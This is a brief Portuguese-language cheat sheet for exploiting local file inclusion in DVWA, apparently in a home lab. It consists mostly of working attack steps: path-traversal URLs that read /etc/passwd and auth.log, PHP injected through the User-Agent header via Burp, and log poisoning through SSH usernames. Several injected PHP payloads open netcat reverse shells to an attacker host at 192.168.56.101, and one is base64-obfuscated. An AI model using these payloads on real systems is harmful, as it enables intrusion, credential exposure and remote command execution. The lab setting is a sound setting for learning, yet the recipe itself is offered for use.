**LFI**


LFI

Exemplo:

http://192.168.56.102/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd


Listando todas as variaveis de um ambiente.

cat /proc/self/environ


Comando para exibir informações de aplicações que usam o php:

Comando inserido via burp no campo user agent:

<?phpinfo();?>


Abrindo conexão com aplicação vulneravel a LFI

Comando inserido via burp suite no campo User-Agent

<?passthru("nc -e /bin/sh x.x.x.x xxx");?>

Esperando o codigo acima ser injetado na aplicação.

nc -vv -l -p xxx



Listando tentativas de log

cat /var/log/auth.log


Comando inserido na regiao de log atraves do terminal utilizando ssh, e apos gravar na regiao de log os coamandos

abaixo, execute novamente a buscar pelo arquivo na aplicação.

ssh "<?passthru("nc -e /bin/bash 192.168.56.101 8888");?>@192.168.56.102

ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNTYuMTAxIDg4ODg='));?>"@192.168.56.102


http://192.168.56.102/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/auth.log

